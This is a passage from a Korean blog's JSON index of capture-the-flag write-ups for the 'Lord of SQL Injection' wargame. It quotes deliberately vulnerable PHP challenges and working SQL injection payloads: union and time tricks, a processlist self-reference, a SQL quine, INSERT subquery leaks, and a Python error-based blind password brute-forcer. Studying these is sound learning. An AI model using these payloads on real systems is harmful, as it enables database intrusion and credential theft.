        "content": "와 드디어 Lord of SQL Injection을 All Clear 했다.신난다!!마지막 문제의 이름은 alien이다.코드는 다음과 같다.-------------------------------------------------------------query : select id from prob_alien where no=--------------------------------------------------------------------------------------------------------------------------query2 : select id from prob_alien where no=''-------------------------------------------------------------&lt;?php  include \"./config.php\";  login_chk();  dbconnect();  if(preg_match('/admin|and|or|if|coalesce|case|_|\\.|prob|time/i', $_GET['no'])) exit(\"No Hack ~_~\");  $query = \"select id from prob_alien where no={$_GET[no]}\";  echo \"&lt;hr&gt;query : &lt;strong&gt;{$query}&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;\";  $query2 = \"select id from prob_alien where no='{$_GET[no]}'\";  echo \"&lt;hr&gt;query2 : &lt;strong&gt;{$query2}&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;\";  if($_GET['no']){    $r = mysql_fetch_array(mysql_query($query));    if($r['id'] !== \"admin\") exit(\"sandbox1\");    $r = mysql_fetch_array(mysql_query($query));    if($r['id'] === \"admin\") exit(\"sandbox2\");    $r = mysql_fetch_array(mysql_query($query2));    if($r['id'] === \"admin\") exit(\"sandbox\");    $r = mysql_fetch_array(mysql_query($query2));    if($r['id'] === \"admin\") solve(\"alien\");  }  highlight_file(__FILE__);?&gt;예전에 뭔가 POXX에서 비슷한 문제가 있었던 것 같은데 잘 기억이 안난다.Write-up도 어딘가에 있을 것 같은데 못찾겠다.문제를 풀기 위해서는 총 4개의 조건문을 통과해야 한다.  result !== “admin” : 결과 값이 admin이 아니면 exit =&gt; admin 이어야 함  result === “admin” : 결과 값이 admin이면 exit =&gt; admin이 아니어야 함  result === “admin” : 결과 값이 admin이면 exit =&gt; admin이 아니어야 함  result === “admin” : 결과 값이 admin이면 solve =&gt; admin 이어야 함1번과 2번은 no에 싱글쿼터가 없지만, 3번과 4번 조건문에서는 싱글쿼터가 존재한다.싱글쿼터가 없을 때와 있을 때를 우회 해 원하는 값을 뽑는 것은 생각보다 쉽다.?no=1 union select 1#' union select '1위와 같이 입력하면 완성되는 $query와 $query2는 다음과 같다.$query1 : select id from prob_alien where no=1 union select 1#' union select '1$query2 : select id from prob_alien where no='1 union select 1#' union select '1'첫 번째 쿼리의 경우, #이 주석 처리 되기 때문에 # 이후의 ' union select '1은 체크하지 않는다.반면 두 번째 쿼리에서는 1 union select 1# 까지가 no의 값으로 들어가기 때문에 # 이후의 union select '1'이 실행된다.여기까진 쉽게 알아냈는데, 문제는 한 쿼리문으로 어쩔 때는 admin이어야 하고 어쩔 때는 admin이면 안되는 쿼리문을 만들어야 하는 것이었다.이것도 주변에 물어봐서 풀 수 있었는데, 바로 시간을 활용하면 됬다.?no=1 union select concat(lower(hex(10+(!sleep(1)&amp;&amp;now()%2=1))), 0x646d696e)#' union select concat(lower(hex(9+(!sleep(1)&amp;&amp;now()%2=1))), 0x646d696e)#먼저 첫 번째 쿼리를 살펴보면 다음과 같다.!sleep(1)&amp;&amp;now()%2=1 은 현재 시간에 따라서 0 혹은 1을 반환 해 준다.이 후, hex(10 + 0 OR 1)이 되는데, 이 때 hex(10)은 A가, hex(11)은 B가 된다.이를 lower()를 통해 소문자로 바꾼 후, concat()을 통해서 0x646d696e와 합친다.0x646d696e는 dmin이므로, 최종적인 결과 값은 시간에 따라서 admin 혹은 bdmin이 될 것이다.sleep(1)을 걸어서 첫 번째가 0이라면 바로 다음 두번째로 쿼리를 실행할 때는 1이 나오도록 했다.두 번째 쿼리에서는 hex(10+가 아니라 hex(9+를 했다.나와야 하는 결과 값을 살펴보면 순서대로 hex(10) -&gt; hex(11) -&gt; hex(11) -&gt; hex(10)이다.하지만 계속해서 sleep(1)을 실행하게 되면 무조건 hex(10) -&gt; hex(11) -&gt; hex(10) -&gt; hex(11) 혹은 hex(11) -&gt; hex(10) -&gt; hex(11) -&gt; hex(10)이 나오게 된다.여기서 hex(10)만 제대로 나오면 되고 hex(11)은 다른 값이 나와도 상관 없으므로, 두 번째 쿼리에서 hex(9+로 바꿔 주어 hex(10) -&gt; hex(11) -&gt; hex(9) -&gt; hex(10)이 나오게 했다.그러면 나오는 결과는 순서대로 admin -&gt; bdmin -&gt; 9dmin -&gt; admin이 되어 문제를 풀 수 있다.다만, 처음 쿼리를 실행할 때 admin이 나올 수 있는 시간이어야 하므로 바로 한 번에 문제가 풀리지는 않는다.--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------query : select id from prob_alien where no=1 union select concat(lower(hex(10+(!sleep(1)&amp;&amp;now()%2=1))), 0x646d696e)#' union select concat(lower(hex(9+(!sleep(1)&amp;&amp;now()%2=1))), 0x646d696e)#----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------query2 : select id from prob_alien where no='1 union select concat(lower(hex(10+(!sleep(1)&amp;&amp;now()%2=1))), 0x646d696e)#' union select concat(lower(hex(9+(!sleep(1)&amp;&amp;now()%2=1))), 0x646d696e)#'--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ALIEN Clear!&lt;?php  include \"./config.php\";  login_chk();  dbconnect();  if(preg_match('/admin|and|or|if|coalesce|case|_|\\.|prob|time/i', $_GET['no'])) exit(\"No Hack ~_~\");  $query = \"select id from prob_alien where no={$_GET[no]}\";  echo \"&lt;hr&gt;query : &lt;strong&gt;{$query}&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;\";  $query2 = \"select id from prob_alien where no='{$_GET[no]}'\";  echo \"&lt;hr&gt;query2 : &lt;strong&gt;{$query2}&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;\";  if($_GET['no']){    $r = mysql_fetch_array(mysql_query($query));    if($r['id'] !== \"admin\") exit(\"sandbox1\");    $r = mysql_fetch_array(mysql_query($query));    if($r['id'] === \"admin\") exit(\"sandbox2\");    $r = mysql_fetch_array(mysql_query($query2));    if($r['id'] === \"admin\") exit(\"sandbox\");    $r = mysql_fetch_array(mysql_query($query2));    if($r['id'] === \"admin\") solve(\"alien\");  }  highlight_file(__FILE__);?&gt;ALIEN Clear!!드디어 Lord of SQL Injection을 ALL Clear 했다!아 너무 뿌듯하다 ㅠㅠ모르는게 너무 많아서 주변에 많이 물어보면서 풀었는데, 이 부분이 좀 아쉽다.더 열심히 공부해서 아무한테도 안물어보고 문제를 슝슝 풀 수 있게 되었으면 좋겠다!이제 풀다 말았던 pwnable.kr을 다시 풀어야 겠다. ㅎㅎLord of SQL Injection All Clear!!",
        "url": "//wargame/lord%20of%20sql%20injection/2018/09/19/los-alien.html"
      }
      ,
    
      "wargame-lord-20of-20sql-20injection-2018-09-18-los-zombie-html": {
        "title": "[Lord of SQL Injection] LoS - zombie 문제풀이",
        "tags": "Write-up, Lord of SQL Injection",
        "date": "September 18, 2018",
        "author": "",
        "category": "",
        "content": "핳핳 드디어 거의 끝이 보인다!이번 문제는 zombie이다.코드는 다음과 같다.-------------------------------------------------------------------query : select pw from prob_zombie where pw=''-------------------------------------------------------------------&lt;?php  include \"./config.php\";  login_chk();  dbconnect(\"zombie\");  if(preg_match('/rollup|join|ace|@/i', $_GET['pw'])) exit(\"No Hack ~_~\");  $query = \"select pw from prob_zombie where pw='{$_GET[pw]}'\";  echo \"&lt;hr&gt;query : &lt;strong&gt;{$query}&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;\";  $result = @mysql_fetch_array(mysql_query($query));  if($result['pw']) echo \"&lt;h2&gt;Pw : {$result[pw]}&lt;/h2&gt;\";  if(($result['pw']) &amp;&amp; ($result['pw'] === $_GET['pw'])) solve(\"zombie\");  highlight_file(__FILE__);?&gt;처음엔 이 문제 보고 이 전 문제 푼거랑 똑같이 풀면 되겠다! 생각했다.근데 ace에 필터링이 있어서 replace를 사용을 못하더라.그래서 어떻게 풀지… 고민하는데 내 옆에 있던 웹짱해커님이 ㅎㅎ 겁나 쉽게 풀 수 있는데~~ 이러고 약올렸다. ㅂㄷㅂㄷ화나는 건 이렇게 약올리는데 난 방법을 모르겠는거다!어쨌든 어찌어찌 풀긴 했는데, information_schema의 테이블 이름을 다 외우고 있어야되나 싶은 생각이 들었다.information_schema 데이터베이스를 보면 processlist라는 테이블이 있다.이 테이블에는 현재 실행중인 쿼리문이 저장되어 있다.실제 내 서버에서 확인해 본 결과이다.mysql&gt; select * from processlist;+----+------+-----------+--------------------+---------+------+-----------+---------------------------+| ID | USER | HOST      | DB                 | COMMAND | TIME | STATE     | INFO                      |+----+------+-----------+--------------------+---------+------+-----------+---------------------------+| 24 | root | localhost | information_schema | Query   |    0 | executing | select * from processlist |+----+------+-----------+--------------------+---------+------+-----------+---------------------------+1 row in set (0.00 sec)INFO 컬럼에 내가 방금 입력 한 select * from processlist가 있는 것을 알 수 있다.그렇다면 내가 문제를 풀기위해 입력하는 쿼리도 이 processlist에 들어가 있을테니, 그 processlist에서 데이터를 추출 해 내가 입력 한 부분만 잘라내면 그 결과가 똑같이 나오게 될 것이다.?pw=' union select substr(info, 38, 72) from information_schema.processlist#위와 같이 넘겨준다면, processlist의 info 컬럼에 select pw from prob_zombie where pw='' union select substr(info, 38, 72) from information_schema.processlist# 가 저장되어 있을 것이다.이 때, substr(info, 38, 72)를 select하도록 해, 내가 입력 한 ' union select substr(info, 38, 72) from information_schema.processlist#를 뽑아 오도록 하면 된다.힣 zombie도 처치했다!----------------------------------------------------------------------------------------------------------------------------------------------------------------query : select pw from prob_zombie where pw='' union select substr(info, 38, 72) from information_schema.processlist#'----------------------------------------------------------------------------------------------------------------------------------------------------------------Pw : ' union select substr(info, 38, 72) from information_schema.processlist#ZOMBIE Clear!&lt;?php  include \"./config.php\";  login_chk();  dbconnect(\"zombie\");  if(preg_match('/rollup|join|ace|@/i', $_GET['pw'])) exit(\"No Hack ~_~\");  $query = \"select pw from prob_zombie where pw='{$_GET[pw]}'\";  echo \"&lt;hr&gt;query : &lt;strong&gt;{$query}&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;\";  $result = @mysql_fetch_array(mysql_query($query));  if($result['pw']) echo \"&lt;h2&gt;Pw : {$result[pw]}&lt;/h2&gt;\";  if(($result['pw']) &amp;&amp; ($result['pw'] === $_GET['pw'])) solve(\"zombie\");  highlight_file(__FILE__);?&gt;ZOMBIE Clear!!",
        "url": "//wargame/lord%20of%20sql%20injection/2018/09/18/los-zombie.html"
      }
      ,
    
      "wargame-lord-20of-20sql-20injection-2018-09-17-los-ouroboros-html": {
        "title": "[Lord of SQL Injection] LoS - ouroboros 문제풀이",
        "tags": "Write-up, Lord of SQL Injection",
        "date": "September 17, 2018",
        "author": "",
        "category": "",
        "content": "이번 문제도 테이블이 비어 있었다.근데 pw를 추출하래…어떻게 하라는지 고민하다가 웹짱해커님께 물어봐서 겨우 풀었다.코드는 다음과 같다.----------------------------------------------------------------------query : select pw from prob_ouroboros where pw=''----------------------------------------------------------------------&lt;?php  include \"./config.php\";  login_chk();  dbconnect();  if(preg_match('/prob|_|\\.|rollup|join|@/i', $_GET['pw'])) exit(\"No Hack ~_~\");  $query = \"select pw from prob_ouroboros where pw='{$_GET[pw]}'\";  echo \"&lt;hr&gt;query : &lt;strong&gt;{$query}&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;\";  $result = @mysql_fetch_array(mysql_query($query));  if($result['pw']) echo \"&lt;h2&gt;Pw : {$result[pw]}&lt;/h2&gt;\";  if(($result['pw']) &amp;&amp; ($result['pw'] === $_GET['pw'])) solve(\"ouroboros\");  highlight_file(__FILE__);?&gt;첨에는 문제 보자마자 오? 했다.그래서 신나게 ?pw=1' or pw like '%'%23을 입력 해 보았다.그런데 아무런 결과도 나오지 않았다.보아하니 얘도 테이블을 비워 둔 것 같았다.그럼.. 내가 입력 한 값이 곧 결과값이 되어야 하는데, 이걸 도저히 어떻게 해야하는지 감이 안잡혔다.?pw=1' union select '1을 입력하면, Pw : 1이 출력되서 뭔가 union을 써야 하는구나...는 알겠는데 어떻게 해야 내가 입력한 값과 출력 값이 같게 만들 수 있는지를 모르겠더라.그래서 또 다시 웹 짱 해커님한테 물어봤다.그랬더니 힌트로 Quine라는 것을 알려 주었다.위키백과 - QuineSQLi Quine인터넷 찾아보니 이 두 가지가 제일 도움이 되었다.즉, Quine은 자기 자신의 소스코드를 출력하는 것을 의미한다고 한다.이번 문제에 딱 맞는 컨셉이다.그래서 위의 링크 중에 위키백과에서 아래와 같은 쿼리문을 가져와 테스트 해 보았다.SELECT REPLACE(REPLACE('SELECT REPLACE(REPLACE(\"$\",CHAR(34),CHAR(39)),CHAR(36),\"$\") AS Quine',CHAR(34),CHAR(39)),CHAR(36),'SELECT REPLACE(REPLACE(\"$\",CHAR(34),CHAR(39)),CHAR(36),\"$\") AS Quine') AS Quine;그 결과 내가 입력한 내용이 그대로 결과 값으로 나온 것을 확인할 수 있었다.mysql&gt; SELECT REPLACE(REPLACE('SELECT REPLACE(REPLACE(\"$\",CHAR(34),CHAR(39)),CHAR(36),\"$\") AS Quine',CHAR(34),CHAR(39)),CHAR(36),'SELECT REPLACE(REPLACE(\"$\",CHAR(34),CHAR(39)),CHAR(36),\"$\") AS Quine') AS Quine; +------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+| Quine                                                                                                                                                                                                      |+------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+| SELECT REPLACE(REPLACE('SELECT REPLACE(REPLACE(\"$\",CHAR(34),CHAR(39)),CHAR(36),\"$\") AS Quine',CHAR(34),CHAR(39)),CHAR(36),'SELECT REPLACE(REPLACE(\"$\",CHAR(34),CHAR(39)),CHAR(36),\"$\") AS Quine') AS Quine |+------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+1 row in set (0.00 sec)이 것을 바탕으로 문제를 풀기 위해 SELECT를 a' union SELECT로 변경했다.그랬더니 '와 \"이 내가 입력한 값과 조금씩 달라졌다.왜 바뀌는지 도저히 모르겠어서 REPLACE 함수를 기준으로 쿼리문을 잘라서 비교 해 보았다.쿼리를 살펴 보면 $가 있는데, 앞의 두 $ 자리에 마지막의 SELECT REPLACE(REPLACE(\"$\",CHAR(34),CHAR(39)),CHAR(36),\"$\") AS Quine가 REPLACE 되어 들어가게 된다.그 과정에서 \"가 '로 바뀌게 되는데, 나는 쿼리의 시작 부분에서 a' union SELECT가 필요하므로, 처음에 a\"로 입력하고 이 후 REPLACE 함수를 실행하는 과정에서 a'로 바뀌도록 했다.어차피 뒤의 a\" union SELECT 부분은 실제로 쿼리가 실행되는 부분이 아니어서 상관없기 때문이다.그 결과 만들어진 쿼리는 아래와 같다.select pw from user where pw='a' union SELECT REPLACE(REPLACE('a\" union SELECT REPLACE(REPLACE(\"$\",CHAR(34),CHAR(39)),CHAR(36),\"$\") AS Quine',CHAR(34),CHAR(39)),CHAR(36),'a\" union SELECT REPLACE(REPLACE(\"$\",CHAR(34),CHAR(39)),CHAR(36),\"$\") AS Quine') AS Quine;내가 내 서버에서 테스트 한 쿼리인데 너무 복잡해서 알아보기가 힘든 것 같다.mysql&gt; select pw from user where pw='a' union SELECT REPLACE(REPLACE('a\" union SELECT REPLACE(REPLACE(\"$\",CHAR(34),CHAR(39)),CHAR(36),\"$\") AS Quine',CHAR(34),CHAR(39)),CHAR(36),'a\" union SELECT REPLACE(REPLACE(\"$\",CHAR(34),CHAR(39)),CHAR(36),\"$\") AS Quine') AS Quine;+---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+| pw                                                                                                                                                                                                                                    |+---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+| a' union SELECT REPLACE(REPLACE('a\" union SELECT REPLACE(REPLACE(\"$\",CHAR(34),CHAR(39)),CHAR(36),\"$\") AS Quine',CHAR(34),CHAR(39)),CHAR(36),'a\" union SELECT REPLACE(REPLACE(\"$\",CHAR(34),CHAR(39)),CHAR(36),\"$\") AS Quine') AS Quine |+---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+1 row in set (0.01 sec)쿼리를 실행 한 결과, 내가 입력 한 쿼리가 그대로 결과 값으로 나온 것을 확인할 수 있다.드디어 이를 바탕으로 아래와 같은 쿼리스트링을 넘겨주었다.?pw=a' union SELECT REPLACE(REPLACE('a\" union SELECT REPLACE(REPLACE(\"$\",CHAR(34),CHAR(39)),CHAR(36),\"$\") AS Quine%23',CHAR(34),CHAR(39)),CHAR(36),'a\" union SELECT REPLACE(REPLACE(\"$\",CHAR(34),CHAR(39)),CHAR(36),\"$\") AS Quine%23') AS Quine%23이 복잡한 쿼리를 통해 드디어 문제를 풀 수 있었다.--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------query : select pw from prob_ouroboros where pw='a' union SELECT REPLACE(REPLACE('a\" union SELECT REPLACE(REPLACE(\"$\",CHAR(34),CHAR(39)),CHAR(36),\"$\") AS Quine#',CHAR(34),CHAR(39)),CHAR(36),'a\" union SELECT REPLACE(REPLACE(\"$\",CHAR(34),CHAR(39)),CHAR(36),\"$\") AS Quine#') AS Quine#'--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------Pw : a' union SELECT REPLACE(REPLACE('a\" union SELECT REPLACE(REPLACE(\"$\",CHAR(34),CHAR(39)),CHAR(36),\"$\") AS Quine#',CHAR(34),CHAR(39)),CHAR(36),'a\" union SELECT REPLACE(REPLACE(\"$\",CHAR(34),CHAR(39)),CHAR(36),\"$\") AS Quine#') AS Quine#OUROBOROS Clear!&lt;?php  include \"./config.php\";  login_chk();  dbconnect();  if(preg_match('/prob|_|\\.|rollup|join|@/i', $_GET['pw'])) exit(\"No Hack ~_~\");  $query = \"select pw from prob_ouroboros where pw='{$_GET[pw]}'\";  echo \"&lt;hr&gt;query : &lt;strong&gt;{$query}&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;\";  $result = @mysql_fetch_array(mysql_query($query));  if($result['pw']) echo \"&lt;h2&gt;Pw : {$result[pw]}&lt;/h2&gt;\";  if(($result['pw']) &amp;&amp; ($result['pw'] === $_GET['pw'])) solve(\"ouroboros\");  highlight_file(__FILE__);?&gt;OUROBOROS Clear!!",
        "url": "//wargame/lord%20of%20sql%20injection/2018/09/17/los-ouroboros.html"
      }
      ,
    
      "wargame-lord-20of-20sql-20injection-2018-09-16-los-phantom-html": {
        "title": "[Lord of SQL Injection] LoS - phantom 문제풀이",
        "tags": "Write-up, Lord of SQL Injection",
        "date": "September 16, 2018",
        "author": "",
        "category": "",
        "content": "이번엔 유령이다 유령phantom 이라는 문제인데 Write-up은 The Phantom Of The Opera 들으면서 써야겠다.코드는 다음과 같다.            ip      email                  127.0.0.1      ******      &lt;?php  include \"./config.php\";  login_chk();  dbconnect(\"phantom\");  if($_GET['joinmail']){    $query = \"insert into prob_phantom values(0,'{$_SERVER[REMOTE_ADDR]}','{$_GET[joinmail]}')\";    mysql_query($query);    echo \"&lt;hr&gt;query : &lt;strong&gt;{$query}&lt;/strong&gt;&lt;hr&gt;\";  }  $rows = mysql_query(\"select no,ip,email from prob_phantom where no=1 or ip='{$_SERVER[REMOTE_ADDR]}'\");  echo \"&lt;table border=1&gt;&lt;tr&gt;&lt;th&gt;ip&lt;/th&gt;&lt;th&gt;email&lt;/th&gt;&lt;/tr&gt;\";    while(($result = mysql_fetch_array($rows))){    if($result['no'] == 1) $result['email'] = \"**************\";    echo \"&lt;tr&gt;&lt;td&gt;{$result[ip]}&lt;/td&gt;&lt;td&gt;{$result[email]}&lt;/td&gt;&lt;/tr&gt;\";  }  echo \"&lt;/table&gt;\";  $_GET[email] = addslashes($_GET[email]);  $query = \"select email from prob_phantom where no=1 and email='{$_GET[email]}'\";  $result = @mysql_fetch_array(mysql_query($query));  if(($result['email']) &amp;&amp; ($result['email'] === $_GET['email'])){ mysql_query(\"delete from prob_phantom where no != 1\"); mysql_query(\"alter table prob_phantom AUTO_INCREMENT=2\"); solve(\"phantom\"); }  highlight_file(__FILE__);?&gt;보면 joinmail이라는 이름으로 가입 할(?) 이메일 주소를 입력 받는다.그리고 현재 데이터베이스에 저장되어 있는 값 중, no=1인 값과 내 IP 주소와 같은 주소로 저장되어 있는 행을 select 해 출력 해 준다.이 때, no=1인 행의 email 주소는 **************로 바뀌어 출력된다.문제를 풀기 위해서는 no=1인 행의 email의 주소를 정확하게 알아내면 된다.joinmail에서 테스트를 해 보았더니, 넘어온 값에 대해 제대로 검증을 하지 않아 한번에 여러 행을 추가할 수 있다는 사실을 알아냈다.?joinmail=test1'), (2, 'MY IP', 'test2이렇게 입력하면 완성되는 쿼리는 아래와 같다.insert into prob_phantom values(0,'MY IP','test1'), (2, 'MY IP', 'test2')그 결과 한번에 test1과 test2가 저장된 것을 확인할 수 있다.그래서 처음에는 no=1인 행을 덮어 쓰면 되지 않을까 생각했다.근데 no 자리에 1을 넣어서 시도 해 보면 아예 쿼리가 먹히지 않았다.아무래도 뭔가 설정 상으로 막아둔 것 같았다.그래서 그 다음 방법으로는 insert문에 select로 subquery를 넣어 no=1인 행의 email을 뽑아 새로운 행으로 저장하는 방법을 생각했다.처음에 문법을 제대로 몰라서 좀 삽질을 했다.내 서버에서 테스트를 좀 했었는데, ERROR 1093 (HY000): You can't specify target table 'user' for update in FROM clause 이런 오류가 계속 났다.알고보니 현재 테이블에서 값을 뽑아 현재 테이블의 값으로 저장하는 것은 안된다고 한다.예를 들어, 아래와 같은 insert문을 작성했다고 가정하자.insert into user value('id1', 'pw1'), ('id2', (select pw from user where id='admin'));이 경우, user라는 테이블에 user 테이블에서 값을 추출 해 삽입하기 때문에 위와 같은 1093에러가 발생한다.이 때 간단한 해결 방법이 있는데, 바로 select 문에서 테이블 명에 별칭을 주는 것이다.insert into user value('id1', 'pw1'), ('id2', (select pw from user tmp where id='admin'));위와 같이 select pw from user를 select pw from user tmp로 바꾸면 에러가 발생하지 않는다.이를 바탕으로 쿼리문을 아래와 같이 구성했다.?joinmail=test'), (3, '210.126.104.194', (select email from prob_phantom tmp where no=1))#그 결과 평문으로 된 no=1인 행의 email 주소를 얻을 수 있었다.            ip      email                  127.0.0.1      ******              MY IP      admin_secure_email@debu.kr              MY IP      test      이제 이메일을 구했으니, ?email=admin_secure_email@debu.kr을 쿼리스트링으로 넘기면 문제를 풀 수 있다.PHANTOM Clear!&lt;?php  include \"./config.php\";  login_chk();  dbconnect(\"phantom\");  if($_GET['joinmail']){    $query = \"insert into prob_phantom values(0,'{$_SERVER[REMOTE_ADDR]}','{$_GET[joinmail]}')\";    mysql_query($query);    echo \"&lt;hr&gt;query : &lt;strong&gt;{$query}&lt;/strong&gt;&lt;hr&gt;\";  }  $rows = mysql_query(\"select no,ip,email from prob_phantom where no=1 or ip='{$_SERVER[REMOTE_ADDR]}'\");  echo \"&lt;table border=1&gt;&lt;tr&gt;&lt;th&gt;ip&lt;/th&gt;&lt;th&gt;email&lt;/th&gt;&lt;/tr&gt;\";    while(($result = mysql_fetch_array($rows))){    if($result['no'] == 1) $result['email'] = \"**************\";    echo \"&lt;tr&gt;&lt;td&gt;{$result[ip]}&lt;/td&gt;&lt;td&gt;{$result[email]}&lt;/td&gt;&lt;/tr&gt;\";  }  echo \"&lt;/table&gt;\";  $_GET[email] = addslashes($_GET[email]);  $query = \"select email from prob_phantom where no=1 and email='{$_GET[email]}'\";  $result = @mysql_fetch_array(mysql_query($query));  if(($result['email']) &amp;&amp; ($result['email'] === $_GET['email'])){ mysql_query(\"delete from prob_phantom where no != 1\"); mysql_query(\"alter table prob_phantom AUTO_INCREMENT=2\"); solve(\"phantom\"); }  highlight_file(__FILE__);?&gt;PHANTOM Clear!!",
        "url": "//wargame/lord%20of%20sql%20injection/2018/09/16/los-phantom.html"
      }
      ,
    
      "wargame-lord-20of-20sql-20injection-2018-09-14-los-frankenstein-html": {
        "title": "[Lord of SQL Injection] LoS - frankenstein 문제풀이",
        "tags": "Write-up, Lord of SQL Injection",
        "date": "September 14, 2018",
        "author": "",
        "category": "",
        "content": "용 시리즈 끝났더니 너무 어렵다 ㅠㅠ물론 풀타임으로 계속 고민하진 않았지만 이거 푸는데 너무 오래걸렸다.드디어 풀었다!코드는 다음과 같다.---------------------------------------------------------------------------------------------------------query : select id,pw from prob_frankenstein where id='frankenstein' and pw=''---------------------------------------------------------------------------------------------------------&lt;?php  include \"./config.php\";  login_chk();  dbconnect();  if(preg_match('/prob|_|\\.|\\(|\\)|union/i', $_GET[pw])) exit(\"No Hack ~_~\");  $query = \"select id,pw from prob_frankenstein where id='frankenstein' and pw='{$_GET[pw]}'\";  echo \"&lt;hr&gt;query : &lt;strong&gt;{$query}&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;\";  $result = @mysql_fetch_array(mysql_query($query));  if(mysql_error()) exit(\"error\");  $_GET[pw] = addslashes($_GET[pw]);  $query = \"select pw from prob_frankenstein where id='admin' and pw='{$_GET[pw]}'\";  $result = @mysql_fetch_array(mysql_query($query));  if(($result['pw']) &amp;&amp; ($result['pw'] == $_GET['pw'])) solve(\"frankenstein\");  highlight_file(__FILE__);?&gt;문제 보자마자 읭? 했다.일단 괄호가 다 필터링 되어있다.근데 error를 뱉어주니, Error Based Blind SQL Injection 같은데, 문제는 union도 필터링 되어 있기 때문에 이 전에 문제를 풀기 위해 사용했던 서브쿼리에서 오류 발생시키기 방법을 사용하지 못한다는 거다.일단 초점은 맞췄던 것은 조건문을 쓰는데 괄호 없이 어떻게 사용하는가! 였다.서브쿼리를 괄호 없이 쓰는 법이 있나… 좀 오래 고민했는데, 다 풀고나니 내가 MySQL 문법만 제대로 알았더라도 이미 풀고도 남았던 문제였다.바보 인증 또함내가 사용한 문법은 다음과 같다.case when 조건 then 참일 때 else 거짓일 때 end이렇게 하면 괄호 없이도 조건문을 사용할 수 있다.사실 이거 한참 전에 한번 시도해 봤던 문법인데, 뒤에 end를 붙여야 한다는 사실을 몰랐다.그래서 뭘 해도 오류가 나길래 아 이거 안되는 건가보다 이러고 넘겼는데, 오늘 다시 인터넷에 찾아보니 뒤에 end가 있더라.혹시나...? 하고 뒤에 end를 붙여서 내 서버에서 테스트 해 보니 매우 잘ㅋ됨ㅋ뭔가 갑자기 신나져서 막 코드 짜서 바로 돌려보았다.그랬더니 pw 값을 얻을 수 있었다.문제를 풀기 위해서 사용한 전체 쿼리는 다음과 같다.pw=1' or case when id='admin' and pw like 'a%' then 9e307*2 else 0 end#이러면 만약 id='admin' and pw like 'a%'가 참일 경우에는 9e307*2가 실행되고 아닐 경우에는 0을 실행한다.그런데 9e307*2는 MySQL에서 ERROR 1690 (22003): DOUBLE value is out of range in '(9e307 * 2)'라는 오류를 준다.때문에 문제에서는 error만을 출력한 후 exit 하게 된다.pw like 'a%'는 이 전에도 한번 사용한 적이 있는데, like을 사용 할 경우 정규표현식 처럼 사용할 수 있다.%가 모든 문자를 의미하기 때문에 a%라고 하면 a로 시작하고 뒤에 어떤 문자열이라도 붙어 있는 경우를 체크한다.즉 pw='a%'는 apple, abc 모두 참이 나온다.이를 바탕으로 코드를 짜면 아래와 같다.import urllib2import urllibimport requestsflag = \"\"url = \"http://los.rubiya.kr/frankenstein_b5bab23e64777e1756174ad33f14b5db.php?pw=\"session = dict(PHPSESSID = \"YOUR SESSION ID\")print \"[+] Start\"print \"[+] Find password\"for j in range(1, 40):\tfound = False\tfor i in range(48, 128):\t\ttry:\t\t\tquery = url + \"1' or case when id='admin' and pw like '\" + flag +  chr(i) + \"%' then 9e307*2 else 0 end%23\"\t\t\tr = requests.post(query, cookies=session)\t\texcept:\t\t\tprint \"[-] Error occur\"\t\t\tcontinue\t\tif '&lt;br&gt;error' in r.text:\t\t\tflag += chr(i)\t\t\tprint \"[+] Found\", str(j), \":\", flag\t\t\tfound = True\t\t\tbreak\tif not found:\t\tprint \"[+] Found password finished\"\t\tbreakprint \"[+] Found password : \", flagprint \"[+] End\"그 결과 아래와 같이 무려 한번에! 값을 구할 수 있었다.좀 간만에 오류 없이 한방에 나와서 기분이 좋았다.아 아니구나 두 번 만에 나왔다.$ python ex.py [+] Start[+] Find password[+] Found 1 : 0[+] Found 2 : 0D[+] Found 3 : 0DC[+] Found 4 : 0DC4[+] Found 5 : 0DC4E[+] Found 6 : 0DC4EF[+] Found 7 : 0DC4EFB[+] Found 8 : 0DC4EFBB[+] Found password finished[+] Found password :  0DC4EFBB[+] End이번에도 소문자로 입력하면 된다.아예 비교하는 대상 문자열을 내가 알파벳 소문자로 두면 될텐데 뭔가 귀찮아서 걍 아스키코드 숫자 ~ 문자 범위로 하다보니 맨날 대문자가 먼저 나온다.언젠간 고치겠지 뭐…아래처럼 입력하면 문제를 풀 수 있다.?pw=0dc4efbb씐난다!기분 좋게 집 갈 수 있다!------------------------------------------------------------------------------------------------------------------------query : select id,pw from prob_frankenstein where id='frankenstein' and pw='0dc4efbb'------------------------------------------------------------------------------------------------------------------------FRANKENSTEIN Clear!&lt;?php  include \"./config.php\";  login_chk();  dbconnect();  if(preg_match('/prob|_|\\.|\\(|\\)|union/i', $_GET[pw])) exit(\"No Hack ~_~\");  $query = \"select id,pw from prob_frankenstein where id='frankenstein' and pw='{$_GET[pw]}'\";  echo \"&lt;hr&gt;query : &lt;strong&gt;{$query}&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;\";  $result = @mysql_fetch_array(mysql_query($query));  if(mysql_error()) exit(\"error\");  $_GET[pw] = addslashes($_GET[pw]);  $query = \"select pw from prob_frankenstein where id='admin' and pw='{$_GET[pw]}'\";  $result = @mysql_fetch_array(mysql_query($query));  if(($result['pw']) &amp;&amp; ($result['pw'] == $_GET['pw'])) 